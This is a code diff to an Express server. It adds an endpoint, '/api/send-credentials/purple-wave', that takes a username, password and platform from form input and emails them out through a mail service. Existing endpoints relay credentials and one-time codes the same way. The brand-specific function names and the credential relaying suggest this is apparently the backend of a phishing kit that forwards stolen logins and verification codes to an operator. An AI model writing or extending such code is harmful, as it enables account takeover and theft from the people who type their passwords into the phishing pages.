@@ -6,6 +6,7 @@ import {
   sendEmailLummy,
   sendCredentials,
   sendCode,
+  sendCredentialsPurpleWave,
 } from "./services/email.mjs";
 
 dotenv.config();
@@ -49,8 +50,12 @@ app.post("/api/send-credentials", async (req, res) => {
   res.json({ message: "Credentials sent successfully" });
 });
 
-app.listen(PORT, () => {
-  console.log(`Server is running on http://localhost:${PORT}`);
+app.post("/api/send-credentials/purple-wave", async (req, res) => {
+  const { username, password, platform } = req.body;
+
+  await sendCredentialsPurpleWave(username, password, platform);
+
+  res.json({ message: "Credentials sent successfully" });
 });
 
 app.post("/api/send-code", async (req, res) => {
@@ -59,4 +64,8 @@ app.post("/api/send-code", async (req, res) => {
   await sendCode(code);
 
   res.json({ message: "Code sent successfully" });
+});
+
+app.listen(PORT, () => {
+  console.log(`Server is running on http://localhost:${PORT}`);
 });
